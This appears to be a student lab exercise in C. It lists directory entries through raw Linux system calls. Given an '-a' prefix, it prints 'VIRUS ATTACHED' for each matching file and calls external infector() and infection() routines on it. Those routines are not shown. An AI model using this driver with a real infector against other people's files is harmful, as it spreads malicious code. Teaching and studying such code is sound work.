#include "util.h"

#define SYS_EXIT 1
#define SYS_GETDENTS 141
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define O_RDONLY	     00
#define O_DIRECTORY	00200000
#define BUF_SIZE 8192

extern int system_call();
extern void infector(char*);
extern void infection();

/* code taken from  sys_getdents man and modified */
struct linux_dirent {
  unsigned long  d_ino;
  int           d_off;
  unsigned short d_reclen;
  char           d_name[];
};

enum {
    DT_UNKNOWN = 0,
# define DT_UNKNOWN	DT_UNKNOWN
    DT_FIFO = 1,
# define DT_FIFO	DT_FIFO
    DT_CHR = 2,
# define DT_CHR		DT_CHR
    DT_DIR = 4,
# define DT_DIR		DT_DIR
    DT_BLK = 6,
# define DT_BLK		DT_BLK
    DT_REG = 8,
# define DT_REG		DT_REG
    DT_LNK = 10,
# define DT_LNK		DT_LNK
    DT_SOCK = 12,
# define DT_SOCK	DT_SOCK
    DT_WHT = 14
# define DT_WHT		DT_WHT
};

int main (int argc , char* argv[], char* envp[])
{
  /*Complete the task here*/
  int file_directory;
  long nread;
  char buf[BUF_SIZE];
  struct linux_dirent *d;
  char d_type;
  long bpos;
  char* prefix = 0;
  int i;

  for(i = 0; i < argc; i++){
    if(strncmp(argv[i], "-a", 2) == 0){
      prefix = argv[i] + 2;
    }
  }

  file_directory = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY);
  if (file_directory == -1)
    system_call(SYS_EXIT, 0x55);

  nread = system_call(SYS_GETDENTS, file_directory, buf, BUF_SIZE);
  if (nread == -1)
    system_call(SYS_EXIT, 0x55);

  for (bpos = 0; bpos < nread;) {
    d = (struct linux_dirent *) (buf + bpos);
    d_type = *(buf + bpos + d->d_reclen - 1);
    char* type = ((d_type == DT_REG) ?  "regular" :
                    (d_type == DT_DIR) ?  "directory" :
                    (d_type == DT_FIFO) ? "FIFO" :
                    (d_type == DT_SOCK) ? "socket" :
                    (d_type == DT_LNK) ?  "symlink" :
                    (d_type == DT_BLK) ?  "block dev" :
                    (d_type == DT_CHR) ?  "char dev" : "???");
    if(prefix == 0){
      system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
      system_call(SYS_WRITE, STDOUT, " ", 1);
      system_call(SYS_WRITE, STDOUT, type, strlen(type));
      system_call(SYS_WRITE, STDOUT, "\n", 1);
    } else {
      system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
      system_call(SYS_WRITE, STDOUT, " ", 1);
      if(strncmp(d->d_name, prefix, strlen(prefix)) == 0){
        system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED\n", strlen("VIRUS ATTACHED\n"));
        infector(d->d_name);
        infection();
      } else {
        system_call(SYS_WRITE, STDOUT, type, strlen(type));
        system_call(SYS_WRITE, STDOUT, "\n", 1);
      }
    }
    bpos += d->d_reclen;
  }
  return 0;
}